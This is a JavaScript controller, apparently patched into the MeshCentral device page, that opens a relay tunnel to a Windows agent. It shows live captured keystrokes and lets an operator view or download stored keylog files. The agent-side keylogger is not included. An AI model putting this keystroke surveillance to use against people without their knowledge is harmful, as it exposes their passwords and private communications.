/*
 * MeshCentral Keylogs tab controller (page 61, mckeylog plugin).
 *
 * Copied to public/scripts/mckeylog-viewmode.js by
 * scripts/patch_meshcentral.js and included by the device page
 * templates. Provides:
 *   - keylogsTabEnter() / keylogsTabExit()  (called from go())
 *   - p61ToggleConnect() / p61SendCmd() / p61FetchFile() (toolbar)
 *
 * Live keystrokes and file data travel over the authenticated agent
 * relay using tunnel protocol 17 (plain JSON over websocket; the
 * agent side is modules_meshcore/win-keylogger.js).
 */
(function () {
    'use strict';

    var root = window;
    var PROTOCOL = 17;
    var MAX_LINES = 2000;
    var VIEW_CAP = 524288; // Show at most ~512 KB of a file inline.
    var CHUNK = 65536;
    var MAX_RECONNECTS = 8;

    var activeSession = null;
    var tabActive = false;
    var reconnectTimer = null;
    var reconnectAttempts = 0;
    var lines = [];
    var pending = null;

    function el(id) { return document.getElementById(id); }

    function statusText(text, ok) {
        var s = el('p61status');
        if (s == null) { return; }
        s.innerHTML = text;
        s.style.color = (ok === true) ? '#2e7d32' : ((ok === false) ? '#b23b3b' : '');
    }

    function updateConnectButton() {
        var b = el('p61connect');
        if (b != null) { b.value = (activeSession != null) ? 'Disconnect' : 'Connect'; }
    }

    function renderLive() {
        var live = el('p61live');
        if (live == null) { return; }
        live.textContent = lines.join('\n');
        var auto = el('p61autoscroll');
        if (auto == null || auto.checked) { live.scrollTop = live.scrollHeight; }
    }

    function appendLines(arr) {
        var i;
        for (i = 0; i < arr.length; i++) { lines.push(arr[i]); }
        if (lines.length > MAX_LINES) { lines = lines.slice(lines.length - MAX_LINES); }
        renderLive();
    }

    function clearLive() {
        lines = [];
        renderLive();
    }

    function b64ToBytes(b64) {
        var bin = atob(b64);
        var n = bin.length;
        var bytes = new Uint8Array(n);
        var i;
        for (i = 0; i < n; i++) { bytes[i] = bin.charCodeAt(i) & 0xff; }
        return bytes;
    }

    function sendCmd(obj) {
        if (activeSession == null || activeSession.redirect.State !== 3) {
            statusText('Not connected to the device.', false);
            return;
        }
        try { activeSession.redirect.sendText(JSON.stringify(obj)); } catch (ex) { }
    }

    function finishPending(viewText) {
        var name = pending.name;
        var total = pending.size;
        pending = null;
        if (viewText != null) {
            lines = ['[ ' + name + ' ]'];
            if (viewText.length > 0) { lines.push(viewText); }
            renderLive();
            if (total > 0 && total > VIEW_CAP) {
                statusText('Loaded the first ' + Math.round(VIEW_CAP / 1024) + ' KB of ' + name + ' (total ' + formatSize(total) + '). Use Download for the full file.', null);
            } else {
                statusText('Loaded ' + name + '.', true);
            }
        } else {
            statusText('Downloaded ' + name + '.', true);
        }
    }

    function handleChunk(msg) {
        var decoded;
        var cap;
        if (pending == null || msg.file !== pending.name) { return; }
        decoded = (msg.data != null && msg.data.length > 0) ? b64ToBytes(msg.data) : new Uint8Array(0);
        pending.offset += decoded.length;
        if ((msg.size == null) || (msg.size > pending.size)) { pending.size = (msg.size == null) ? 0 : msg.size; }
        if (pending.mode === 'view') {
            if (decoded.length > 0 && pending.stored < VIEW_CAP && pending.decoder != null) {
                var room = VIEW_CAP - pending.stored;
                var slice = (decoded.length > room) ? decoded.subarray(0, room) : decoded;
                pending.text += pending.decoder.decode(slice, { stream: true });
                pending.stored += slice.length;
            }
        } else {
            pending.parts.push(decoded);
            pending.partLen += decoded.length;
        }
        if (msg.done === true) {
            if (pending.mode === 'view') {
                if (pending.decoder != null) { pending.text += pending.decoder.decode(new Uint8Array(0), { stream: true }); }
                finishPending(pending.text);
            } else {
                downloadParts(pending);
                pending = null;
            }
            return;
        }
        // "view" stops fetching once the visible portion is captured.
        if (pending.mode === 'view') {
            cap = (pending.size > 0) ? Math.min(pending.size, VIEW_CAP) : VIEW_CAP;
            if (pending.stored >= cap) {
                if (pending.decoder != null) { pending.text += pending.decoder.decode(new Uint8Array(0), { stream: true }); }
                finishPending(pending.text);
                return;
            }
        }
        sendCmd({ cmd: 'read', file: pending.name, offset: pending.offset, max: CHUNK });
    }

    function downloadParts(p) {
        var total = 0;
        var i;
        for (i = 0; i < p.parts.length; i++) { total += p.parts[i].length; }
        var all = new Uint8Array(total);
        var o = 0;
        for (i = 0; i < p.parts.length; i++) {
            all.set(p.parts[i], o);
            o += p.parts[i].length;
        }
        try {
            var blob = new Blob([all], { type: 'application/octet-stream' });
            var url = URL.createObjectURL(blob);
            var a = document.createElement('a');
            a.href = url;
            a.download = p.name;
            document.body.appendChild(a);
            a.click();
            document.body.removeChild(a);
            setTimeout(function () { URL.revokeObjectURL(url); }, 10000);
        } catch (ex) {
            statusText('Could not download the file: ' + ex.message, false);
        }
    }

    function formatSize(n) {
        if (n == null) { return '?'; }
        if (n < 1024) { return n + ' B'; }
        if (n < 1024 * 1024) { return (n / 1024).toFixed(1) + ' KB'; }
        return (n / (1024 * 1024)).toFixed(2) + ' MB';
    }

    function escapeHtml(s) {
        return String(s).replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;').replace(/'/g, '&#39;');
    }

    function renderFiles(files) {
        var tb = el('p61files');
        var i;
        if (tb == null) { return; }
        if (!files || files.length === 0) {
            tb.innerHTML = '<tr><td colspan=4 style="font-size:13px">No previous keylog files found on this device.</td></tr>';
            return;
        }
        var x = '';
        for (i = 0; i < files.length; i++) {
            var f = files[i];
            var when = '';
            try { when = new Date(f.mtime).toLocaleString(); } catch (ex) { when = String(f.mtime); }
            x += '<tr>' +
                '<td style="font-family:Consolas,monospace;font-size:12px">' + escapeHtml(f.name) + '</td>' +
                '<td>' + formatSize(f.size) + '</td>' +
                '<td>' + escapeHtml(when) + '</td>' +
                '<td style="white-space:nowrap">' +
                '<input type=button value="View" style="margin-right:4px" onclick=p61FetchFile(\'' + escapeHtml(f.name) + '\',\'view\') /> ' +
                '<input type=button value="Download" onclick=p61FetchFile(\'' + escapeHtml(f.name) + '\',\'download\') />' +
                '</td></tr>';
        }
        tb.innerHTML = x;
    }

    function onMessage(data) {
        var msg = null;
        try { msg = JSON.parse(data); } catch (ex) { return; }
        if (msg == null || typeof msg.type !== 'string') { return; }
        if (msg.type === 'keys') {
            if (msg.lines != null && msg.lines.length > 0) { appendLines(msg.lines); }
        } else if (msg.type === 'state') {
            var st = msg.state;
            if (st == null) { return; }
            if (st.available === false) {
                statusText('Keylogger is not available on this agent (Windows agents with the keylogger build required).', false);
            } else if (st.running) {
                statusText('Keylogging is ON - ' + st.totalKeys + ' keys captured. File: ' + (st.currentFile || '?') + '. Live keystrokes appear below.', true);
            } else {
                statusText('Keylogging is OFF. Press Start Logging, or view a previous file below.', false);
            }
            if (st.lastError) { statusText('Keylogger: ' + st.lastError, false); }
        } else if (msg.type === 'files') {
            renderFiles(msg.files);
        } else if (msg.type === 'filechunk') {
            handleChunk(msg);
        } else if (msg.type === 'error') {
            statusText('Error: ' + (msg.message || 'unknown error'), false);
        }
    }

    function onState(session, state) {
        if (activeSession !== session) { return; }
        if (state === 3) {
            reconnectAttempts = 0;
            statusText('Connected. Keylog data appears below.', true);
            sendCmd({ cmd: 'tail' }); // Subscribe: live keys + state + file list.
        } else if (state === 2) {
            statusText('Connecting to the agent tunnel...', null);
        } else if (state === 0) {
            activeSession = null;
            pending = null;
            updateConnectButton();
            if (tabActive && !session.closing) {
                if (reconnectAttempts < MAX_RECONNECTS) {
                    reconnectAttempts++;
                    statusText('Connection lost. Reconnecting (' + reconnectAttempts + '/' + MAX_RECONNECTS + ')...', null);
                    if (reconnectTimer == null) {
                        reconnectTimer = root.setTimeout(function () {
                            reconnectTimer = null;
                            if (tabActive && activeSession == null) { connect(); }
                        }, 2500);
                    }
                } else {
                    statusText('Connection lost. Press Connect to retry.', false);
                }
            } else {
                statusText('Not connected.', false);
            }
        }
    }

    function connect() {
        if (activeSession != null) { return; }
        if (typeof root.CreateAgentRedirect !== 'function' || root.meshserver == null) {
            statusText('MeshCentral agent relay support is unavailable.', false);
            return;
        }
        if (root.currentNode == null) { statusText('No device selected.', false); return; }
        var nodeid = root.currentNode._id;
        var session = { redirect: null, closing: false };
        var module = {
            protocol: PROTOCOL,
            ProcessData: function (data) { if (tabActive) { onMessage(data); } },
            ProcessBinaryData: function () { },
            xxStateChange: function (state) { onState(session, state); }
        };
        try {
            session.redirect = root.CreateAgentRedirect(
                root.meshserver,
                module,
                root.serverPublicNamePort,
                root.authCookie,
                root.authRelayCookie,
                root.domainUrl
            );
        } catch (ex) {
            statusText('Could not open the keylog tunnel: ' + ex.message, false);
            return;
        }
        activeSession = session;
        updateConnectButton();
        statusText('Connecting to the device...', null);
        try { session.redirect.Start(nodeid); } catch (ex) { statusText('Could not start the keylog tunnel: ' + ex.message, false); }
    }

    function disconnect() {
        if (reconnectTimer != null) { root.clearTimeout(reconnectTimer); reconnectTimer = null; }
        if (activeSession != null) {
            activeSession.closing = true;
            if (activeSession.redirect.State === 3) {
                try { activeSession.redirect.sendText(JSON.stringify({ cmd: 'unsub' })); } catch (ex) { }
            }
            try { activeSession.redirect.Stop(); } catch (ex) { }
            activeSession = null;
        }
        pending = null;
        updateConnectButton();
    }

    /* ---------------- public entry points ---------------- */

    root.keylogsTabEnter = function () {
        tabActive = true;
        reconnectAttempts = 0;
        connect();
    };

    root.keylogsTabExit = function () {
        tabActive = false;
        disconnect();
    };

    root.p61ToggleConnect = function () {
        if (activeSession != null) { disconnect(); statusText('Not connected.', false); }
        else { reconnectAttempts = 0; connect(); }
    };

    root.p61SendCmd = function (cmd) {
        if (typeof cmd === 'string') { cmd = { cmd: cmd }; }
        if (activeSession == null) { statusText('Not connected to the device.', false); return; }
        try { activeSession.redirect.sendText(JSON.stringify(cmd)); } catch (ex) { }
    };

    root.p61FetchFile = function (name, mode) {
        if (activeSession == null) { statusText('Not connected to the device.', false); return; }
        if (pending != null) { statusText('A file is already being read.', false); return; }
        if (mode !== 'view' && mode !== 'download') { mode = 'view'; }
        var decoder = (typeof TextDecoder !== 'undefined') ? new TextDecoder('utf-8') : null;
        pending = {
            name: name, mode: mode, offset: 0, size: 0,
            parts: [], partLen: 0,
            decoder: decoder, text: '', stored: 0
        };
        if (mode === 'view') {
            var live = el('p61live');
            if (live != null) { live.textContent = '[ ' + name + ' ]'; }
        }
        statusText('Reading ' + name + '...', null);
        sendCmd({ cmd: 'read', file: name, offset: 0, max: CHUNK });
    };
})();
